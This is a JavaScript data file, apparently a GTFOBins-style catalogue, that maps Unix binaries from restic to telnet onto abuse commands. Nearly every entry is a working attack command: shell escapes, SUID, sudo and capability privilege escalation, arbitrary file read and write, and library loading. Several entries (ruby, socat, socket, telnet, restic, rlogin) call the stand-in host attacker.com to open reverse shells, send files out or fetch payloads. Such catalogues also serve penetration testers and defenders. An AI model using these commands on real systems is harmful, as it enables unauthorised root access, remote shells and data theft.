            "file-upload": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which restic) .\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""],
            "sudo": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ rev ============ */
    {
        name: "rev",
        functions: {
            "file-read": ["LFILE=file_to_read\nrev $LFILE | rev"],
            "suid": ["sudo install -m =xs $(which rev) .\n\nLFILE=file_to_read\n./rev $LFILE | rev"],
            "sudo": ["LFILE=file_to_read\nsudo rev $LFILE | rev"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ rlogin ============ */
    {
        name: "rlogin",
        functions: {
            "file-upload": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST"]
        },
        contexts: ["unprivileged"]
    },

    /* ============ rlwrap ============ */
    {
        name: "rlwrap",
        functions: {
            "shell": ["rlwrap /bin/sh"],
            "file-write": ["LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA"],
            "suid": ["sudo install -m =xs $(which rlwrap) .\n\n./rlwrap -H /dev/null /bin/sh -p"],
            "sudo": ["sudo rlwrap /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ rpm ============ */
    {
        name: "rpm",
        functions: {
            "shell": ["rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"],
            "sudo": ["sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"],
            "limited-suid": ["sudo install -m =xs $(which rpm) .\n\n./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ rpmdb ============ */
    {
        name: "rpmdb",
        functions: {
            "shell": ["rpmdb --eval '%(/bin/sh 1>&2)'"],
            "sudo": ["sudo rpmdb --eval '%(/bin/sh 1>&2)'"],
            "limited-suid": ["sudo install -m =xs $(which rpmdb) .\n\n./rpmdb --eval '%(/bin/sh 1>&2)'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ rpmquery ============ */
    {
        name: "rpmquery",
        functions: {
            "shell": ["rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"],
            "sudo": ["sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"],
            "limited-suid": ["sudo install -m =xs $(which rpmquery) .\n\n./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ rpmverify ============ */
    {
        name: "rpmverify",
        functions: {
            "shell": ["rpmverify --eval '%(/bin/sh 1>&2)'"],
            "sudo": ["sudo rpmverify --eval '%(/bin/sh 1>&2)'"],
            "limited-suid": ["sudo install -m =xs $(which rpmverify) .\n\n./rpmverify --eval '%(/bin/sh 1>&2)'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ rsync ============ */
    {
        name: "rsync",
        functions: {
            "shell": ["rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"],
            "suid": ["sudo install -m =xs $(which rsync) .\n\n./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"],
            "sudo": ["sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ rtorrent ============ */
    {
        name: "rtorrent",
        functions: {
            "shell": ["echo \"execute = /bin/sh,-c,\\\"/bin/sh <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\nrtorrent"],
            "suid": ["sudo install -m =xs $(which rtorrent) .\n\necho \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent"]
        },
        contexts: ["unprivileged", "suid"]
    },

    /* ============ ruby ============ */
    {
        name: "ruby",
        functions: {
            "shell": ["ruby -e 'exec \"/bin/sh\"'"],
            "reverse-shell": ["export RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"],
            "file-upload": ["export LPORT=8888\nruby -run -e httpd . -p $LPORT"],
            "file-download": ["export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'"],
            "file-write": ["ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'"],
            "file-read": ["ruby -e 'puts File.read(\"file_to_read\")'"],
            "library-load": ["ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'"],
            "sudo": ["sudo ruby -e 'exec \"/bin/sh\"'"],
            "capabilities": ["cp $(which ruby) .\nsudo setcap cap_setuid+ep ruby\n\n./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"]
        },
        contexts: ["unprivileged", "sudo", "capabilities"]
    },

    /* ============ run-mailcap ============ */
    {
        name: "run-mailcap",
        functions: {
            "shell": ["run-mailcap --action=view /etc/hosts\n!/bin/sh"],
            "file-read": ["run-mailcap --action=view file_to_read"],
            "sudo": ["sudo run-mailcap --action=view /etc/hosts\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ run-parts ============ */
    {
        name: "run-parts",
        functions: {
            "shell": ["run-parts --new-session --regex '^sh$' /bin"],
            "suid": ["sudo install -m =xs $(which run-parts) .\n\n./run-parts --new-session --regex '^sh$' /bin --arg='-p'"],
            "sudo": ["sudo run-parts --new-session --regex '^sh$' /bin"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ runscript ============ */
    {
        name: "runscript",
        functions: {
            "shell": ["TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nrunscript $TF"],
            "sudo": ["TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF"],
            "limited-suid": ["sudo install -m =xs $(which runscript) .\n\nTF=$(mktemp)\necho '! exec /bin/sh' >$TF\n./runscript $TF"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ rview ============ */
    {
        name: "rview",
        functions: {
            "shell": ["rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "file-write": ["rview file_to_write\niDATA\n^[\nw!"],
            "file-read": ["rview file_to_read"],
            "library-load": ["rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"],
            "suid": ["sudo install -m =xs $(which rview) .\n\n./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
            "sudo": ["sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "capabilities": ["cp $(which rview) .\nsudo setcap cap_setuid+ep rview\n\n./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which rview) .\n\n./rview -c ':lua os.execute(\"reset; exec sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities", "limited-suid"]
    },

    /* ============ rvim ============ */
    {
        name: "rvim",
        functions: {
            "shell": ["rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "file-write": ["rvim file_to_write\niDATA\n^[\nw"],
            "file-read": ["rvim file_to_read"],
            "library-load": ["rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"],
            "suid": ["sudo install -m =xs $(which rvim) .\n\n./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
            "sudo": ["sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "capabilities": ["cp $(which rvim) .\nsudo setcap cap_setuid+ep rvim\n\n./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which rvim) .\n\n./rvim -c ':lua os.execute(\"reset; exec sh\")'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "capabilities", "limited-suid"]
    },

    /* ============ sash ============ */
    {
        name: "sash",
        functions: {
            "shell": ["sash"],
            "suid": ["sudo install -m =xs $(which sash) .\n\n./sash"],
            "sudo": ["sudo sash"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ scanmem ============ */
    {
        name: "scanmem",
        functions: {
            "shell": ["scanmem\nshell /bin/sh"],
            "suid": ["sudo install -m =xs $(which scanmem) .\n\n./scanmem\nshell /bin/sh"],
            "sudo": ["sudo scanmem\nshell /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ scp ============ */
    {
        name: "scp",
        functions: {
            "shell": ["TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:"],
            "sudo": ["TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:"],
            "limited-suid": ["sudo install -m =xs $(which scp) .\n\nTF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ screen ============ */
    {
        name: "screen",
        functions: {
            "shell": ["screen"],
            "file-write": ["LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA"],
            "sudo": ["sudo screen"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ script ============ */
    {
        name: "script",
        functions: {
            "shell": ["script -q /dev/null"],
            "file-write": ["script -q -c 'echo DATA' file_to_write"],
            "sudo": ["sudo script -q /dev/null"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ scrot ============ */
    {
        name: "scrot",
        functions: {
            "shell": ["scrot -e /bin/sh"],
            "sudo": ["sudo scrot -e /bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which scrot) .\n\n./scrot -e /bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ sed ============ */
    {
        name: "sed",
        functions: {
            "shell": ["sed -n '1e exec sh 1>&0' /etc/hosts"],
            "command": ["sed -n '1e id' /etc/hosts"],
            "file-write": ["LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts"],
            "file-read": ["LFILE=file_to_read\nsed '' \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which sed) .\n\nLFILE=file_to_read\n./sed -e '' \"$LFILE\""],
            "sudo": ["sudo sed -n '1e exec sh 1>&0' /etc/hosts"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ service ============ */
    {
        name: "service",
        functions: {
            "shell": ["/usr/sbin/service ../../bin/sh"],
            "sudo": ["sudo service ../../bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ setarch ============ */
    {
        name: "setarch",
        functions: {
            "shell": ["setarch $(arch) /bin/sh"],
            "suid": ["sudo install -m =xs $(which setarch) .\n\n./setarch $(arch) /bin/sh -p"],
            "sudo": ["sudo setarch $(arch) /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ setfacl ============ */
    {
        name: "setfacl",
        functions: {
            "suid": ["sudo install -m =xs $(which setfacl) .\n\nLFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE"],
            "sudo": ["LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ setlock ============ */
    {
        name: "setlock",
        functions: {
            "shell": ["TF=$(mktemp)\nsetlock $TF /bin/sh"],
            "suid": ["sudo install -m =xs $(which setlock) .\n\n./setlock - /bin/sh -p"],
            "sudo": ["sudo setlock - /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ sftp ============ */
    {
        name: "sftp",
        functions: {
            "shell": ["sftp $HOST\n!/bin/sh"],
            "file-upload": ["sftp $RHOST\nput file_to_send file_to_save"],
            "file-download": ["sftp $RHOST\nget file_to_get file_to_save"],
            "sudo": ["sudo sftp $HOST\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ sg ============ */
    {
        name: "sg",
        functions: {
            "shell": ["sg $(id -ng)"],
            "sudo": ["sudo sg root"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ shuf ============ */
    {
        name: "shuf",
        functions: {
            "file-write": ["LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\""],
            "file-read": ["LFILE=file_to_read\nshuf -z \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which shuf) .\n\nLFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\""],
            "sudo": ["LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ slsh ============ */
    {
        name: "slsh",
        functions: {
            "shell": ["slsh -e 'system(\"/bin/sh\")'"],
            "sudo": ["sudo slsh -e 'system(\"/bin/sh\")'"],
            "limited-suid": ["sudo install -m =xs $(which slsh) .\n\n./slsh -e 'system(\"/bin/sh\")'"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ smbclient ============ */
    {
        name: "smbclient",
        functions: {
            "shell": ["smbclient '\\\\attacker\\share'\n!/bin/sh"],
            "file-upload": ["smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"],
            "file-download": ["smbclient '\\\\attacker\\share' -c 'get file_to_get where_to_save'"],
            "sudo": ["sudo smbclient '\\\\attacker\\share'\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ snap ============ */
    {
        name: "snap",
        functions: {
            "sudo": ["COMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\nsudo snap install xxxx_1.0_all.snap --dangerous --devmode"]
        },
        contexts: ["sudo"]
    },

    /* ============ socat ============ */
    {
        name: "socat",
        functions: {
            "shell": ["socat stdin exec:/bin/sh"],
            "reverse-shell": ["RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"],
            "bind-shell": ["LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"],
            "file-upload": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT"],
            "file-download": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat"],
            "file-write": ["LFILE=file_to_write\nsocat -u 'exec:echo DATA' \"open:$LFILE,creat\""],
            "file-read": ["LFILE=file_to_read\nsocat -u \"file:$LFILE\" -"],
            "sudo": ["sudo socat stdin exec:/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which socat) .\n\nRHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ socket ============ */
    {
        name: "socket",
        functions: {
            "reverse-shell": ["RHOST=attacker.com\nRPORT=12345\nsocket -qvp '/bin/sh -i' $RHOST $RPORT"],
            "bind-shell": ["LPORT=12345\nsocket -svp '/bin/sh -i' $LPORT"]
        },
        contexts: ["unprivileged"]
    },

    /* ============ soelim ============ */
    {
        name: "soelim",
        functions: {
            "file-read": ["LFILE=file_to_read\nsoelim \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which soelim) .\n\nLFILE=file_to_read\n./soelim \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo soelim \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ softlimit ============ */
    {
        name: "softlimit",
        functions: {
            "shell": ["softlimit /bin/sh"],
            "suid": ["sudo install -m =xs $(which softlimit) .\n\n./softlimit /bin/sh -p"],
            "sudo": ["sudo softlimit /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ sort ============ */
    {
        name: "sort",
        functions: {
            "file-read": ["LFILE=file_to_read\nsort -m \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which sort) .\n\nLFILE=file_to_read\n./sort -m \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo sort -m \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ split ============ */
    {
        name: "split",
        functions: {
            "shell": ["split --filter=/bin/sh /dev/stdin"],
            "command": ["COMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF"],
            "file-write": ["TF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF"],
            "file-read": ["LFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*"],
            "sudo": ["sudo split --filter=/bin/sh /dev/stdin"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ sqlite3 ============ */
    {
        name: "sqlite3",
        functions: {
            "shell": ["sqlite3 /dev/null '.shell /bin/sh'"],
            "file-write": ["LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'"],
            "file-read": ["LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"],
            "suid": ["sudo install -m =xs $(which sqlite3) .\n\nLFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"],
            "sudo": ["sudo sqlite3 /dev/null '.shell /bin/sh'"],
            "limited-suid": ["sudo install -m =xs $(which sqlite3) .\n\n./sqlite3 /dev/null '.shell /bin/sh'"]
        },
        contexts: ["unprivileged", "suid", "sudo", "limited-suid"]
    },

    /* ============ sqlmap ============ */
    {
        name: "sqlmap",
        functions: {
            "shell": ["sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""],
            "sudo": ["sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ss ============ */
    {
        name: "ss",
        functions: {
            "file-read": ["LFILE=file_to_read\nss -a -F $LFILE"],
            "suid": ["sudo install -m =xs $(which ss) .\n\nLFILE=file_to_read\n./ss -a -F $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo ss -a -F $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ssh ============ */
    {
        name: "ssh",
        functions: {
            "shell": ["ssh localhost $SHELL --noprofile --norc\n\nssh -o ProxyCommand=';sh 0<&2 1>&2' x"],
            "file-read": ["LFILE=file_to_read\nssh -F $LFILE localhost"],
            "sudo": ["sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ ssh-agent ============ */
    {
        name: "ssh-agent",
        functions: {
            "shell": ["ssh-agent /bin/sh"],
            "suid": ["sudo install -m =xs $(which ssh-agent) .\n\n./ssh-agent /bin/ -p"],
            "sudo": ["sudo ssh-agent /bin/"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ssh-keygen ============ */
    {
        name: "ssh-keygen",
        functions: {
            "library-load": ["ssh-keygen -D ./lib.so"],
            "suid": ["sudo install -m =xs $(which ssh-keygen) .\n\n./ssh-keygen -D ./lib.so"],
            "sudo": ["sudo ssh-keygen -D ./lib.so"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ ssh-keyscan ============ */
    {
        name: "ssh-keyscan",
        functions: {
            "file-read": ["LFILE=file_to_read\nssh-keyscan -f $LFILE"],
            "suid": ["sudo install -m =xs $(which ssh-keyscan) .\n\nLFILE=file_to_read\n./ssh-keyscan -f $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ sshpass ============ */
    {
        name: "sshpass",
        functions: {
            "shell": ["sshpass /bin/sh"],
            "suid": ["sudo install -m =xs $(which sshpass) .\n\n./sshpass /bin/sh -p"],
            "sudo": ["sudo sshpass /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ start-stop-daemon ============ */
    {
        name: "start-stop-daemon",
        functions: {
            "shell": ["start-stop-daemon -n $RANDOM -S -x /bin/sh"],
            "suid": ["sudo install -m =xs $(which start-stop-daemon) .\n\n./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"],
            "sudo": ["sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ stdbuf ============ */
    {
        name: "stdbuf",
        functions: {
            "shell": ["stdbuf -i0 /bin/sh"],
            "suid": ["sudo install -m =xs $(which stdbuf) .\n\n./stdbuf -i0 /bin/sh -p"],
            "sudo": ["sudo stdbuf -i0 /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ strace ============ */
    {
        name: "strace",
        functions: {
            "shell": ["strace -o /dev/null /bin/sh"],
            "file-write": ["LFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA"],
            "suid": ["sudo install -m =xs $(which strace) .\n\n./strace -o /dev/null /bin/sh -p"],
            "sudo": ["sudo strace -o /dev/null /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ strings ============ */
    {
        name: "strings",
        functions: {
            "file-read": ["LFILE=file_to_read\nstrings \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which strings) .\n\nLFILE=file_to_read\n./strings \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo strings \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ su ============ */
    {
        name: "su",
        functions: {
            "sudo": ["sudo su"]
        },
        contexts: ["sudo"]
    },

    /* ============ sudo ============ */
    {
        name: "sudo",
        functions: {
            "sudo": ["sudo sudo /bin/sh"]
        },
        contexts: ["sudo"]
    },

    /* ============ sysctl ============ */
    {
        name: "sysctl",
        functions: {
            "command": ["COMMAND='/bin/sh -c id>/tmp/id'\nsysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id"],
            "file-read": ["LFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\""],
            "suid": ["sudo install -m =xs $(which sysctl) .\n\nCOMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id"],
            "sudo": ["COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ systemctl ============ */
    {
        name: "systemctl",
        functions: {
            "suid": ["sudo install -m =xs $(which systemctl) .\n\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF"],
            "sudo": ["TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice"]
        },
        contexts: ["suid", "sudo"]
    },

    /* ============ systemd-resolve ============ */
    {
        name: "systemd-resolve",
        functions: {
            "sudo": ["sudo systemd-resolve --status\n!sh"]
        },
        contexts: ["sudo"]
    },

    /* ============ tac ============ */
    {
        name: "tac",
        functions: {
            "file-read": ["LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which tac) .\n\nLFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tail ============ */
    {
        name: "tail",
        functions: {
            "file-read": ["LFILE=file_to_read\ntail -c1G \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which tail) .\n\nLFILE=file_to_read\n./tail -c1G \"$LFILE\""],
            "sudo": ["LFILE=file_to_read\nsudo tail -c1G \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tar ============ */
    {
        name: "tar",
        functions: {
            "shell": ["tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
            "file-write": ["LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P"],
            "file-read": ["LFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'"],
            "sudo": ["sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which tar) .\n\n./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ task ============ */
    {
        name: "task",
        functions: {
            "shell": ["task execute /bin/sh"],
            "sudo": ["sudo task execute /bin/sh"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ taskset ============ */
    {
        name: "taskset",
        functions: {
            "shell": ["taskset 1 /bin/sh"],
            "suid": ["sudo install -m =xs $(which taskset) .\n\n./taskset 1 /bin/sh -p"],
            "sudo": ["sudo taskset 1 /bin/sh"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tasksh ============ */
    {
        name: "tasksh",
        functions: {
            "shell": ["tasksh\n!/bin/sh"],
            "sudo": ["sudo tasksh\n!/bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which tasksh) .\n\n./tasksh\n!/bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ tbl ============ */
    {
        name: "tbl",
        functions: {
            "file-read": ["LFILE=file_to_read\ntbl $LFILE"],
            "suid": ["sudo install -m =xs $(which tbl) .\n\nLFILE=file_to_read\n./tbl $LFILE"],
            "sudo": ["LFILE=file_to_read\nsudo tbl $LFILE"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tclsh ============ */
    {
        name: "tclsh",
        functions: {
            "shell": ["tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"],
            "suid": ["sudo install -m =xs $(which tclsh) .\n\n./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"],
            "sudo": ["sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ tcpdump ============ */
    {
        name: "tcpdump",
        functions: {
            "command": ["COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF"],
            "sudo": ["COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"]
        },
        contexts: ["unprivileged", "sudo"]
    },

    /* ============ tdbtool ============ */
    {
        name: "tdbtool",
        functions: {
            "shell": ["tdbtool\n! /bin/sh"],
            "sudo": ["sudo tdbtool\n! /bin/sh"],
            "limited-suid": ["sudo install -m =xs $(which tdbtool) .\n\n./tdbtool\n! /bin/sh"]
        },
        contexts: ["unprivileged", "sudo", "limited-suid"]
    },

    /* ============ tee ============ */
    {
        name: "tee",
        functions: {
            "file-write": ["LFILE=file_to_write\necho DATA | tee -a \"$LFILE\""],
            "suid": ["sudo install -m =xs $(which tee) .\n\nLFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\""],
            "sudo": ["LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\""]
        },
        contexts: ["unprivileged", "suid", "sudo"]
    },

    /* ============ telnet ============ */
    {
        name: "telnet",
        functions: {
            "shell": ["RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh"],
            "reverse-shell": ["RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF"],
            "sudo": ["RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh"],
